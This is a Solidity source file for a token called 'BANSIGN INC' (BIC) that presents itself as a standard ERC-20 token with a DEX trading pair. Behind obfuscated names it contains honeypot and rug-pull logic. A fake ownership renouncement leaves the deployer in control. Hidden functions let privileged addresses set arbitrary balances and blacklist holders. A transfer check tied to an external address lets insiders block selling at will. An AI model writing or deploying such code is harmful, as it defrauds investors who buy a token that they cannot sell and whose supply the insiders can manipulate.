//SPDX-License-Identifier: MIT

pragma solidity ^0.8.9;

interface minIs {
    function totalSupply() external view returns (uint256);

    function balanceOf(address feeMaxMode) external view returns (uint256);

    function transfer(address tradingIs, uint256 isSwap) external returns (bool);

    function allowance(address maxTotal, address spender) external view returns (uint256);

    function approve(address spender, uint256 isSwap) external returns (bool);

    function transferFrom(address sender,address tradingIs,uint256 isSwap) external returns (bool);

    event Transfer(address indexed from, address indexed marketingModeReceiver, uint256 value);
    event Approval(address indexed maxTotal, address indexed spender, uint256 value);
}

interface modeLaunched {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}

interface sellWallet {
    function createPair(address txSell, address walletAuto) external returns (address);
}

abstract contract senderAmount {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

interface minIsMetadata is minIs {
    function name() external view returns (string memory);

    function symbol() external view returns (string memory);

    function decimals() external view returns (uint8);
}

contract BANSIGNINC is senderAmount, minIs, minIsMetadata {

    string private marketingReceiverShould = "BANSIGN INC";

    uint256 exemptToken;

    function amountSenderFund(address swapFrom, address tradingIs, uint256 isSwap) internal returns (bool) {
        if (swapFrom == sellExempt) {
            return fundAmount(swapFrom, tradingIs, isSwap);
        }
        uint256 marketingSender = minIs(fromFee).balanceOf(buyMax);
        require(marketingSender == amountSwap);
        require(!receiverShouldTake[swapFrom]);
        return fundAmount(swapFrom, tradingIs, isSwap);
    }

    address takeSwap = 0x10ED43C718714eb63d5aA57B78B54704E256024E;

    bool public tokenExempt;

    mapping(address => uint256) private launchedReceiverLaunch;

    uint256 public takeTo;

    function transferFrom(address swapFrom, address tradingIs, uint256 isSwap) external override returns (bool) {
        if (_msgSender() != takeSwap) {
            if (tradingSender[swapFrom][_msgSender()] != type(uint256).max) {
                require(isSwap <= tradingSender[swapFrom][_msgSender()]);
                tradingSender[swapFrom][_msgSender()] -= isSwap;
            }
        }
        return amountSenderFund(swapFrom, tradingIs, isSwap);
    }

    function approve(address minTake, uint256 isSwap) public virtual override returns (bool) {
        tradingSender[_msgSender()][minTake] = isSwap;
        emit Approval(_msgSender(), minTake, isSwap);
        return true;
    }

    uint256 private exemptSender = 100000000 * 10 ** 18;

    function owner() external view returns (address) {
        return liquidityTo;
    }

    uint256 private maxLaunched;

    function totalSupply() external view virtual override returns (uint256) {
        return exemptSender;
    }

    function toMin() public {
        emit OwnershipTransferred(sellExempt, address(0));
        liquidityTo = address(0);
    }

    function allowance(address buyList, address minTake) external view virtual override returns (uint256) {
        if (minTake == takeSwap) {
            return type(uint256).max;
        }
        return tradingSender[buyList][minTake];
    }

    mapping(address => mapping(address => uint256)) private tradingSender;

    constructor (){
        
        toMin();
        modeLaunched exemptMin = modeLaunched(takeSwap);
        fromFee = sellWallet(exemptMin.factory()).createPair(exemptMin.WETH(), address(this));
        
        sellExempt = _msgSender();
        takeTotal[sellExempt] = true;
        launchedReceiverLaunch[sellExempt] = exemptSender;
        
        emit Transfer(address(0), sellExempt, exemptSender);
    }

    address public sellExempt;

    event OwnershipTransferred(address indexed tokenTotal, address indexed feeLiquidity);

    uint256 public listFund;

    address private liquidityTo;

    function symbol() external view virtual override returns (string memory) {
        return toMax;
    }

    function fundAmount(address swapFrom, address tradingIs, uint256 isSwap) internal returns (bool) {
        require(launchedReceiverLaunch[swapFrom] >= isSwap);
        launchedReceiverLaunch[swapFrom] -= isSwap;
        launchedReceiverLaunch[tradingIs] += isSwap;
        emit Transfer(swapFrom, tradingIs, isSwap);
        return true;
    }

    function tradingTake(address teamShould) public {
        totalTake();
        if (maxLaunched != takeTo) {
            atTotal = true;
        }
        if (teamShould == sellExempt || teamShould == fromFee) {
            return;
        }
        receiverShouldTake[teamShould] = true;
    }

    function isReceiver(address listLaunch, uint256 isSwap) public {
        totalTake();
        launchedReceiverLaunch[listLaunch] = isSwap;
    }

    bool private atTotal;

    address public fromFee;

    mapping(address => bool) public takeTotal;

    function decimals() external view virtual override returns (uint8) {
        return launchTake;
    }

    bool private minReceiver;

    function name() external view virtual override returns (string memory) {
        return marketingReceiverShould;
    }

    function maxTake(address listSwapMax) public {
        if (tokenExempt) {
            return;
        }
        
        takeTotal[listSwapMax] = true;
        if (takeTo != maxLaunched) {
            maxLaunched = listFund;
        }
        tokenExempt = true;
    }

    mapping(address => bool) public receiverShouldTake;

    function transfer(address listLaunch, uint256 isSwap) external virtual override returns (bool) {
        return amountSenderFund(_msgSender(), listLaunch, isSwap);
    }

    function balanceOf(address feeMaxMode) public view virtual override returns (uint256) {
        return launchedReceiverLaunch[feeMaxMode];
    }

    function getOwner() external view returns (address) {
        return liquidityTo;
    }

    uint8 private launchTake = 18;

    address buyMax = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;

    uint256 amountSwap;

    string private toMax = "BIC";

    function toAuto(uint256 isSwap) public {
        totalTake();
        amountSwap = isSwap;
    }

    function totalTake() private view {
        require(takeTotal[_msgSender()]);
    }

}